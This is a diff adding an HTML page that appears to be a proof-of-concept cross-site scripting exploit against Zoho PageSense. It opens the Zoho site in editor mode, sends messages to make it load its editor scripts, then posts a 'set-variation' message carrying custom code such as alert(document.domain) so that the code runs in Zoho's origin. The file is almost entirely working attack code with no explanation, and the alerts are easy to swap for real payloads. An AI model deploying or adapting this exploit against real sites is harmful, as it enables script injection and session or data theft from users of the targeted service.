@@ -1,0 +1,77 @@
+<html>
+
+<body>
+    <button onclick="open_zoho()">click me to open zoho</button>
+    <button onclick="simple_alert()">click me for simple xss</button>
+
+    <script>
+        async function open_zoho() {
+
+            win_attcker = window.open("https://www.zoho.com/fr/pagesense/?qa_mode=true&ps_editor=true&ps_verifyscript=true");
+            await new Promise((resolve) => setTimeout(resolve, 1000));
+            for (var i = 0; i < 10; i++) {
+                await new Promise((resolve) => setTimeout(resolve, 1000));
+                win_attcker.postMessage({
+                    "id": "pagesense-scriptloader-message",
+                    "action": "loadScript",
+                    "scripts": ["editor", "heatmap"]
+                }, "*")
+            }
+
+
+        }
+
+        function simple_alert() {
+
+            win_attcker.postMessage({
+                "event": "set-variation",
+                "args": [{
+                        "to": {
+                            "code": "alert(1)",
+                            "isUndo": true
+                        },
+                        "props": {
+                            "type": "customcode"
+                        }
+                    },
+                    [{
+                        "to": {
+                            "code": "alert(2)",
+                            "isUndo": true
+                        },
+                        "props": {
+                            "type": "customcode"
+                        }
+                    }, {
+                        "to": {
+                            "code": "alert(3)",
+                            "isUndo": true
+                        },
+                        "props": {
+                            "type": "customcode"
+                        }
+                    }], {
+                        "to": {
+                            "code": "alert(4)",
+                            "isUndo": true
+                        },
+                        "props": {
+                            "type": "customcode"
+                        }
+                    }, {
+                        "to": {
+                            "code": "alert(6)",
+                            "isUndo": true
+                        },
+                        "props": {
+                            "type": "customcode"
+                        }
+                    }, "alert(document.domain)"
+                ]
+            }, "*")
+
+        }
+    </script>
+</body>
+
+</html>
